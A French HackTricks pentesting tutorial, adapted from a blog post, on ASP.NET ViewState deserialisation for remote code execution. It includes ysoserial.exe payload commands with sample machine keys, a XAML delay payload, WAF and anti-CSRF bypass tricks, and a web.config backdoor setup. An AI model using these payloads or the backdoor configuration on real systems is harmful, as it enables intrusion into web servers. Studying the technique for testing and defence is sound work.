<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et au [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Le contenu de ce post a √©t√© extrait de** [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

# Introduction

Les applications web ASP.NET utilisent ViewState pour maintenir l'√©tat d'une page et persister les donn√©es dans un formulaire web.

Il est normalement possible d'**ex√©cuter du code sur un serveur web o√π un ViewState valide peut √™tre forg√©**. Cela peut √™tre fait lorsque la fonctionnalit√© de **validation MAC** a √©t√© **d√©sactiv√©e** ou en connaissant :

* **La cl√© de validation et son algorithme** **avant** la version **4.5** de .NET Framework
* **La cl√© de validation, l'algorithme de validation, la cl√© de d√©cryptage et l'algorithme de d√©cryptage** dans la version 4.5 ou sup√©rieure de .NET Framework

Afin de pr√©venir les attaques de manipulation, .NET Framework peut **signer et chiffrer** le ViewState qui a √©t√© s√©rialis√© en utilisant la classe `LosFormatter`. Il v√©rifie ensuite la signature en utilisant le m√©canisme de validation de code d'authentification de message (MAC). La classe `ObjectStateFormatter` effectue les t√¢ches de signature, de chiffrement et de v√©rification. Les **cl√©s requises pour effectuer le m√©canisme de signature et/ou de chiffrement** peuvent √™tre stock√©es dans la section `machineKey` des fichiers **`web.config`** (niveau d'application) ou **`machine.config`** (niveau de la machine). C'est g√©n√©ralement le cas lorsque plusieurs serveurs web sont utilis√©s pour servir la m√™me application souvent derri√®re un √©quilibreur de charge dans une ferme web ou un cluster. Ce qui suit montre le format de la section `machineKey` dans un fichier de configuration d'une application ASP.NET qui utilise la version 2.0 ou sup√©rieure de .NET Framework :
```markup
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="SHA1" decryption="AES"  />
```
Il convient de noter que lorsqu'une section `machineKey` n'a pas √©t√© d√©finie dans les fichiers de configuration ou lorsque les attributs `validationKey` et `decryptionKey` ont √©t√© d√©finis sur `AutoGenerate`, **l'application g√©n√®re les valeurs requises de mani√®re dynamique** en fonction d'un secret cryptographique al√©atoire. Les algorithmes peuvent √©galement √™tre s√©lectionn√©s automatiquement. Actuellement, dans la derni√®re version du framework .NET, l'algorithme de validation par d√©faut est `HMACSHA256` et l'algorithme de d√©cryptage par d√©faut est `AES`. Voir [\[13\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection) pour plus de d√©tails.

# RCE avec validation MAC ViewState d√©sactiv√©e

Dans le pass√©, il √©tait possible de **d√©sactiver la validation MAC** simplement en d√©finissant la propri√©t√© `enableViewStateMac` sur `False`. Microsoft a publi√© un correctif en septembre 2014 [\[3\]](https://devblogs.microsoft.com/aspnet/farewell-enableviewstatemac/) pour imposer la validation MAC en ignorant cette propri√©t√© dans toutes les versions du framework .NET. Bien que certains d'entre nous puissent croire que "_la validation MAC ViewState ne peut plus √™tre d√©sactiv√©e_" [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET), il est toujours possible de d√©sactiver la fonctionnalit√© de validation MAC en d√©finissant la cl√© de registre `AspNetEnforceViewStateMac` sur z√©ro dans:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
En alternative, l'ajout du param√®tre **dangereux** suivant au fichier `web.config` de niveau application peut √©galement d√©sactiver la validation MAC :
```markup
<configuration>
‚Ä¶
    <appSettings>
      <add key="aspnet:AllowInsecureDeserialization" value="true" />
    </appSettings>
</configuration>
```
{% hint style="danger" %}
Lorsque la validation MAC de ViewState a √©t√© **d√©sactiv√©e**, le projet [YSoSerial.Net](https://github.com/pwntester/ysoserial.net) peut √™tre utilis√© pour g√©n√©rer des charges utiles `LosFormatter` en tant que ViewState afin d'ex√©cuter du code arbitraire sur le serveur.
{% endhint %}

Avant la version **4.5** du Framework .NET, le param√®tre `__VIEWSTATE` pouvait √™tre **crypt√© alors que la fonctionnalit√© de validation MAC √©tait d√©sactiv√©e**. Il convient de noter que **la plupart des scanners** ne tentent pas d'envoyer un param√®tre ViewState non crypt√© pour identifier cette vuln√©rabilit√©. Par cons√©quent, un **test manuel** est n√©cessaire pour v√©rifier si la validation MAC est d√©sactiv√©e lorsque le param√®tre `__VIEWSTATE` a √©t√© crypt√©. Cela peut √™tre v√©rifi√© en envoyant une courte cha√Æne al√©atoire en base64 dans le param√®tre `__VIEWSTATE`. L'URL suivante montre un exemple :
```
https://victim.com/path/page.aspx?__VIEWSTATE=AAAA
```
Si la page cible **r√©pond avec une erreur, la fonctionnalit√© de validation MAC a √©t√© d√©sactiv√©e** sinon elle aurait supprim√© le message d'erreur de validation MAC.\
Cependant, dans les sc√©narios o√π vous ne pouvez pas voir le message d'erreur, cette astuce ne fonctionnera pas.

Les scanners automatis√©s devraient utiliser une **charge utile qui provoque un court d√©lai** c√¥t√© serveur. Cela peut √™tre r√©alis√© en ex√©cutant le code ASP.NET suivant, par exemple, pour cr√©er un d√©lai de 10 secondes :
```
System.Threading.Thread.Sleep(10000);
```

```bash
string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Thr=""clr-namespace:System.Threading;assembly=mscorlib"">
     <ObjectDataProvider x:Key=""x"" ObjectType = ""{ x:Type Thr:Thread}"" MethodName = ""Sleep"" >
     <ObjectDataProvider.MethodParameters>
        <System:Int32>10000</System:Int32>
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
```
# RCE avec validation MAC ViewState activ√©e

Dans les anciennes versions (**ant√©rieures √† 4.5**), le Framework .NET utilise la propri√©t√© **`TemplateSourceDirectory`** [\[15\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.control.templatesourcedirectory) lors de la **signature** d'un objet s√©rialis√©. Cependant, depuis la version **4.5**, il utilise les cha√Ænes **`Purpose`** pour cr√©er le hash. Ces deux m√©canismes **requi√®rent le chemin cible √† partir de la racine du r√©pertoire de l'application** et le **nom de la page**. Ces param√®tres peuvent √™tre **extraits de l'URL**.

Les applications qui utilisent un **ancien framework** et qui imposent le chiffrement ViewState peuvent **encore accepter un ViewState sign√© sans chiffrement**. Cela signifie que **conna√Ætre la cl√© de validation et son algorithme est suffisant** pour exploiter un site web. Il semble que ViewState soit chiffr√© par d√©faut **depuis la version 4.5** m√™me lorsque la propri√©t√© `viewStateEncryptionMode` a √©t√© d√©finie sur `Never`. Cela signifie que dans les derni√®res versions du Framework .NET, la **cl√© de d√©chiffrement et son algorithme sont √©galement requis** pour cr√©er une charge utile.

Le ViewState ASP.NET contient une propri√©t√© appel√©e `ViewStateUserKey` [\[16\]](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972969\(v=msdn.10\)) qui peut √™tre utilis√©e pour att√©nuer les risques d'attaques de falsification de requ√™tes intersites (CSRF) [\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET). La valeur de la propri√©t√© **`ViewStateUserKey`** (lorsqu'elle n'est pas `null`**) est √©galement utilis√©e pendant le processus de signature ViewState**. Bien que ne pas conna√Ætre la valeur de ce param√®tre puisse arr√™ter notre attaque, **sa valeur peut souvent √™tre trouv√©e dans les cookies ou dans un param√®tre d'entr√©e cach√©** ([\[17\]](https://software-security.sans.org/developer-how-to/developer-guide-csrf) montre un exemple impl√©ment√©).

## Plugins ViewState YSoSerial.Net

Dans YSoSerial.Net master et YSoSerial.Netv2, vous pouvez trouver un plugin ([**celui-ci**](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs) et [**celui-ci**](https://github.com/pwntester/ysoserial.net/blob/v2/ysoserial/Plugins/ViewStatePlugin.cs)) pour exploiter cette technique lorsque toutes les informations sont connues.

### **Pour .NET Framework >= 4.5:**
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
### **Pour .NET Framework <= 4.0 (h√©ritage):**

_La cl√© de d√©cryptage et son algorithme ne sont pas n√©cessaires ici:_
```bash
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
```
_A part d'utiliser diff√©rents gadgets, il est possible d'utiliser le param√®tre `__VIEWSTATEGENERATOR` **au lieu de fournir les chemins** :_
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
Il utilise par d√©faut le gadget ActivitySurrogateSelector qui n√©cessite la compilation de la classe ExploitClass.cs dans le projet YSoSerial.Net. La charge utile ViewState peut √©galement √™tre **chiffr√©e** pour √©viter les pare-feux applicatifs Web lorsque la valeur decryptionKey est connue :
```bash
.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
{% hint style="info" %}
**Note :** En raison de la nature des gadgets utilis√©s dans YSoSerial.Net, la page ASP.NET cible r√©pond toujours avec une erreur m√™me si une exploitation a √©t√© ex√©cut√©e avec succ√®s c√¥t√© serveur.
{% endhint %}

### Chemin de l'application

Il est important de trouver la racine du chemin de l'application afin de cr√©er un ViewState valide, sauf si :

* L'application utilise la version 4.0 ou inf√©rieure du Framework .NET ; et
* Le param√®tre `__VIEWSTATEGENERATOR` est connu.

La capture d'√©cran suivante montre l'arborescence des chemins dans IIS :

![](https://soroush.secproject.com/downloadable/images/aspnetviewstate/iis.png)

Vous pouvez consulter [\[20\]](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis) si vous n'√™tes pas familier avec les termes de r√©pertoire virtuel et d'application dans IIS.

Pour g√©n√©rer un ViewState pour l'URL ci-dessus, les arguments `--path` et `--apppath` doivent √™tre les suivants :
```
--path=/dir1/vDir1/dir2/app1/dir3/app2/vDir2/dir4
--apppath=/app2/ 
```
Si nous ne savions pas que "app2" √©tait un nom d'application, nous pourrions utiliser **l'essai et l'erreur pour tester tous les noms de r√©pertoires** dans l'URL un par un jusqu'√† trouver un ViewState qui peut ex√©cuter du code sur le serveur (peut-√™tre en obtenant une demande DNS ou en causant un d√©lai).

### G√©n√©rateur

Dans ce cas, l'argument `--generator` peut √™tre utilis√©. L'argument `--isdebug` peut √™tre utilis√© pour v√©rifier si le plugin calcule √©galement le m√™me param√®tre `__VIEWSTATEGENERATOR` lorsque les arguments `--path` et `--apppath` ont √©t√© fournis.

## Exploitation des anciennes versions

Aucun gadget n'a √©t√© identifi√© pour exploiter .NET Framework v1.1 au moment de la r√©daction de ce billet de blog.

Pour exploiter les applications qui utilisent .NET Framework v4.0 ou inf√©rieur, la branche YSoSerial.Net v2.0 [\[21\]](https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/tree/master/ysoserial.net-v2) peut √™tre utilis√©e (cela a √©t√© d√©velopp√© √† l'origine dans le cadre d'une autre recherche [\[22\]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)). Cependant, ce projet ne prend en charge qu'un nombre limit√© de gadgets et n√©cessite √©galement que la bo√Æte cible ait .NET Framework 3.5 ou une version sup√©rieure install√©e.

## **Autres outils**

Il semble qu'Immunity Canvas supporte la cr√©ation du param√®tre ViewState lorsque les cl√©s de validation et de chiffrement sont connues [\[29\]](https://vimeopro.com/user18478112/canvas/video/260982761). Les outils suivants ont √©galement √©t√© publi√©s par co√Øncidence au moment o√π j'allais publier mon travail, ce qui √©tait assez surprenant :

* [https://github.com/0xACB/viewgen](https://github.com/0xACB/viewgen) (√©crit en Python)
* [https://github.com/Illuminopi/RCEvil.NET](https://github.com/Illuminopi/RCEvil.NET) (√©crit en .NET)

Je pense que ces outils ne **diff√©rencient actuellement pas entre les diff√©rentes versions de .NET** Framework et ciblent la cryptographie h√©rit√©e. De plus, ils **n'utilisent pas le param√®tre `ViewStateUserKey`** qui pourrait √™tre utilis√© pour arr√™ter les attaques CSRF.

# Conseils suppl√©mentaires

## **Utilisation de requ√™tes GET**

Il est √©galement possible d'envoyer le param√®tre `__VIEWSTATE` dans l'URL via une requ√™te GET. Le seul facteur limitant est la longueur de l'URL qui limite le type de gadgets qui peuvent √™tre utilis√©s ici.

## **Chiffrement dans .NET Framework ant√©rieur √† la version 4.5**

Comme mentionn√© pr√©c√©demment, le param√®tre `__VIEWSTATE` n'a pas besoin d'√™tre chiffr√© lors de l'exploitation de .NET Framework 4.0 et inf√©rieur (test√© sur v2.0 √† v4.0) m√™me lorsque la propri√©t√© `ViewStateEncryptionMode` a √©t√© d√©finie sur `Always`. ASP.NET d√©cide si le ViewState a √©t√© chiffr√© ou non en trouvant le param√®tre `__VIEWSTATEENCRYPTED` dans la requ√™te (il n'a pas besoin d'avoir de valeur). Par cons√©quent, il est possible d'envoyer un ViewState non chiffr√© en supprimant le param√®tre `__VIEWSTATEENCRYPTED` de la requ√™te.

Cela signifie √©galement que le changement de la cl√© de d√©chiffrement ou de son algorithme ne peut pas arr√™ter les attaques lorsque la cl√© de validation et son algorithme ont √©t√© vol√©s.

Le param√®tre `__VIEWSTATE` peut √™tre chiffr√© pour contourner les WAF.

## **Contournement du m√©canisme anti-CSRF (anti-XSRF)**

Une page ASP.NET produit une erreur lorsqu'un param√®tre `__VIEWSTATE` invalide est utilis√©. Cependant, la page peut toujours recevoir ses entr√©es lorsque `Request.Form` est utilis√© directement dans le code, par exemple en utilisant `Request.Form["txtMyInput"]` plut√¥t que `txtMyInput.Text`. **L'attaque CSRF peut √™tre r√©alis√©e en supprimant le param√®tre `__VIEWSTATE` de la requ√™te ou en ajoutant le param√®tre `__PREVIOUSPAGE` avec une valeur invalide**. Comme le param√®tre `__PREVIOUSPAGE` est crypt√© et format√© en base64 par d√©faut, m√™me la fourniture d'un seul caract√®re comme valeur devrait provoquer une erreur.

Cela peut entra√Æner le contournement du m√©canisme de protection anti-CSRF qui a √©t√© mis en place en d√©finissant le param√®tre `Page.ViewStateUserKey`.

## **Utilisation du param√®tre ViewStateGenerator**

Lorsque le param√®tre `__VIEWSTATEGENERATOR` est connu, il peut √™tre utilis√© pour les applications ASP.NET qui utilisent la version .NET Framework 4.0 ou inf√©rieure afin de signer un objet s√©rialis√© sans conna√Ætre le chemin d'application.

## **D√©coupage du ViewState pour contourner les WAF**

Il est possible de diviser le param√®tre `__VIEWSTATE` en plusieurs parties lorsque la propri√©t√© **`MaxPageStateFieldLength`** a √©t√© d√©finie sur une **valeur positive**. Sa valeur **par d√©faut** est **n√©gative** et cela signifie que le param√®tre **`__VIEWSTATE`** ne peut pas √™tre divis√© en plusieurs parties.

Cela peut √™tre utile pour contourner certains WAF lorsque le d√©coupage du ViewState est autoris√©.

## **Exploitation du param√®tre EventValidation**

Le param√®tre `__EVENTVALIDATION` et quelques autres param√®tres sont √©galement s√©rialis√©s de mani√®re similaire au param√®tre `__VIEWSTATE` et peuvent √™tre cibl√©s de mani√®re similaire. L'exploitation d'un probl√®me de d√©s√©rialisation via `__EVENTVALIDATION` est plus restreinte et n√©cessite :

* Une requ√™te POST
* Une page ASP.NET qui accepte des param√®tres d'entr√©e
* Un nom de param√®tre d'entr√©e valide. Par exemple, le param√®tre `myinput` dans la requ√™te POST lorsque nous avons le code suivant c√¥t√© serveur :
```markup
<asp:TextBox runat="server" ID="myinput" />
```
La valeur du param√®tre `__VIEWSTATE` peut √™tre vide dans la requ√™te lors de l'exploitation du param√®tre `__EVENTVALIDATION`, mais elle doit exister.

La cha√Æne `Purpose` utilis√©e par .NET Framework 4.5 et sup√©rieur pour cr√©er une signature valide est diff√©rente en fonction du param√®tre utilis√©. Le tableau suivant montre les cha√Ænes `Purpose` d√©finies dans .NET Framework :

| **Param√®tre d'entr√©e**                                       | **Cha√Æne Purpose**                                 |
| ------------------------------------------------------------ | -------------------------------------------------- |
| ‚Äú\_\_VIEWSTATE‚Äù                                              | WebForms.HiddenFieldPageStatePersister.ClientState |
| ‚Äú\_\_EVENTVALIDATION‚Äù                                        | WebForms.ClientScriptManager.EventValidation       |
| P2 dans P1\|P2 dans ‚Äú\_\_dv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù           | WebForms.DetailsView.KeyTable                      |
| P4 dans P1\|P2\|P3\|P4 dans ‚Äú\_\_CALLBACKPARAM‚Äù                  | WebForms.DetailsView.KeyTable                      |
| P3 dans P1\|P2\|P3\|P4 dans ‚Äú\_\_gv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù   | WebForms.GridView.SortExpression                   |
| P4 dans P1\|P2\|P3\|P4 dans ‚Äú\_\_gv‚Äù + ClientID + ‚Äú\_\_hidden‚Äù   | WebForms.GridView.DataKeys                         |

Le tableau ci-dessus montre tous les param√®tres d'entr√©e qui peuvent √™tre cibl√©s.

## **Attention au param√®tre PreviousPage**

Lorsque le param√®tre **`__PREVIOUSPAGE`** existe dans la requ√™te avec des donn√©es **invalides**, l'**application** ne **d√©s√©rialise pas** le param√®tre **`__VIEWSTATE`**. Fournir le param√®tre `__CALLBACKID` emp√™che ce comportement.

## **Fiabilit√© des erreurs**

Comme expliqu√© pr√©c√©demment, nous utilisons parfois des erreurs pour v√©rifier si un ViewState g√©n√©r√© est valide. ASP.NET n'affiche pas l'erreur de validation MAC par d√©faut lorsqu'un param√®tre `__VIEWSTATEGENERATOR` invalide est utilis√©. Ce comportement change lorsque la propri√©t√© `ViewStateUserKey` est utilis√©e, car ASP.NET ne supprime plus les erreurs de validation MAC.

En plus de cela, les applications web ASP.NET peuvent ignorer les erreurs de validation MAC avec le param√®tre suivant m√™me lorsque la propri√©t√© `ViewStateUserKey` est utilis√©e :
```markup
<appSettings>
      <add key="aspnet:AlwaysIgnoreViewStateValidationErrors" value="true" />
</appSettings>
```
# Web.config comme une porte d√©rob√©e

Si les attaquants peuvent **modifier** le fichier **`web.config`** √† la racine d'une application, ils peuvent **facilement ex√©cuter du code** sur le serveur. Cependant, int√©grer une porte d√©rob√©e furtive dans l'application pourrait √™tre un bon choix pour un attaquant. Cela peut √™tre fait en **d√©sactivant la validation MAC** et en d√©finissant la propri√©t√© `viewStateEncryptionMode` sur `Always`. Cela signifie que toutes les pages ASP.NET qui ne d√©finissent pas la propri√©t√© `ViewStateEncryptionMode` sur `Auto` ou `Never` utilisent toujours des param√®tres ViewState chiffr√©s. Cependant, comme les **ViewState n'utilisent pas la fonctionnalit√© de validation MAC, ils sont maintenant vuln√©rables √† l'ex√©cution de code √† distance via la d√©s√©rialisation de donn√©es non fiables**. L'exemple suivant montre cela:
```markup
<configuration>
‚Ä¶
    <system.web>
‚Ä¶
        <pages enableViewStateMac="false" viewStateEncryptionMode="Always" />
    </system.web>
    <appSettings>
        <add key="aspnet:AllowInsecureDeserialization" value="false" />
    </appSettings>
</configuration>
```
Une autre option pour un site web autonome serait de d√©finir la section `machineKey` avec des cl√©s et des algorithmes arbitraires pour emp√™cher d'autres attaquants !

Il convient de noter que la d√©finition de la propri√©t√© `EnableViewState` sur `False` ne permet pas d'arr√™ter cette attaque car le ViewState sera toujours analys√© par ASP.NET.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
